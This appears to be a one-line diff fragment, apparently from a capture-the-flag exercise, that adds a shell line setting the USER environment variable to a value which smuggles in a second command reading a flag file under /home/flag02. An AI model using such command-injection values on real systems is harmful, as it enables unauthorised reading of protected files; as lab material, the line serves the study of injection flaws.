@@ -1,0 +1,1 @@
+export USER=”; cat /home/flag02/flag.txt”
